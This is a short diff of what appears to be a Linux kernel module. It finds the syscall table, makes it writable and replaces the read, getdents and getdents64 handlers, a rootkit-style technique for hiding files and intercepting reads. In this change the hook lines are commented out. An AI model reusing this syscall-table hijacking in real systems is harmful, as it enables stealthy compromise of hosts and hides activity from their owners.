@@ -363,24 +363,22 @@ int install_hooks(void) {
     syscall_table = lookup_syscall_table_by_file();// (long unsigned int*)kallsyms_lookup_name("sys_call_table");
     echo("sys_call_table address %lu\n", syscall_table);
     if(!syscall_table) return 0;
-
-    return 0;
     make_vm_rw(syscall_table);
 
     /** read
      */
-    original_syscall_table[__NR_read] = syscall_table[__NR_read];
-    syscall_table[__NR_read] = (long unsigned int)alpine_ksys_read;
+    //original_syscall_table[__NR_read] = syscall_table[__NR_read];
+    //syscall_table[__NR_read] = (long unsigned int)alpine_ksys_read;
 
     /** getdents
      */
-    original_syscall_table[__NR_getdents] = syscall_table[__NR_getdents];
-    syscall_table[__NR_getdents] = (long unsigned int)alpine_ksys_getdents;
+    //original_syscall_table[__NR_getdents] = syscall_table[__NR_getdents];
+    //syscall_table[__NR_getdents] = (long unsigned int)alpine_ksys_getdents;
 
     /** getdents64
      */
-    original_syscall_table[__NR_getdents64] = syscall_table[__NR_getdents64];
-    syscall_table[__NR_getdents64] = (long unsigned int)alpine_ksys_getdents64;
+    //original_syscall_table[__NR_getdents64] = syscall_table[__NR_getdents64];
+    //syscall_table[__NR_getdents64] = (long unsigned int)alpine_ksys_getdents64;
     make_vm_ro((long unsigned int)syscall_table);
     return 0;
 }
@@ -388,8 +386,8 @@ void uninstall_hooks(void){
     if(!syscall_table) return ;
     echo("sys_call_table address %lu\n", syscall_table);
     make_vm_rw(syscall_table);
-    syscall_table[__NR_read] = original_syscall_table[__NR_read];
-    syscall_table[__NR_getdents] = original_syscall_table[__NR_getdents];
-    syscall_table[__NR_getdents64] = original_syscall_table[__NR_getdents64];
+    //syscall_table[__NR_read] = original_syscall_table[__NR_read];
+    //syscall_table[__NR_getdents] = original_syscall_table[__NR_getdents];
+    //syscall_table[__NR_getdents64] = original_syscall_table[__NR_getdents64];
     make_vm_ro((long unsigned int)syscall_table);
 }
